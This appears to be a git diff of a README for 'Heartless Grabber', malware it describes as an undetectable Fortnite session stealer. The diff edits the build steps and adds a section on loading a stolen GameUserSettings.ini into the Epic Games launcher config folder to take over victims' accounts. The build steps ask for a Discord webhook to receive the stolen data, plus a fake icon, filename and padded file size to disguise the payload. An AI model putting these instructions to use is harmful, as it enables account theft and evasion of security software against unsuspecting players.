@@ -10,9 +10,18 @@ Basic FUD (fully undetected) Fornite session stealer.
 
 ## How to Build?
 
-1. Download and install [Python 3](https://www.python.org/downloads/) (Make sure to enable the *Add to PATH* option.)
-2. Verify the installation by executing `python --version` in [CMD](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?).
+1. Download and install [Python 3](https://www.python.org/downloads/) (Make sure to enable the *Add to PATH* option)
+2. Verify the installation by executing `python --version` in [CMD](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?)
 3. [Download Heartless Grabber](#download).
-4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
-5. Run the *main.bat* file.
-6. Provide the discord webhook, icon filepath (must be .ico [png-to-ico converter](https://convertico.com/)), filename, and bloat size (for realistic file size).
+4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file
+5. Run the *main.bat* file
+6. Provide the discord webhook, icon filepath (must be .ico [png-to-ico converter](https://convertico.com/)), filename, and bloat size (for realistic file size)
+
+## How to use the GameUserSettings.ini
+
+1. press win + r to open up run
+2. type in %localappdata\EpicGamesLauncher\Saved\Config\Windows%
+
+![example](https://imgur.com/tqH0VJb.png)
+
+3. Replace the GameUserSettings.ini in there with the one downloaded (I suggest making a folder to store them, so that way you can easily swap between accounts)
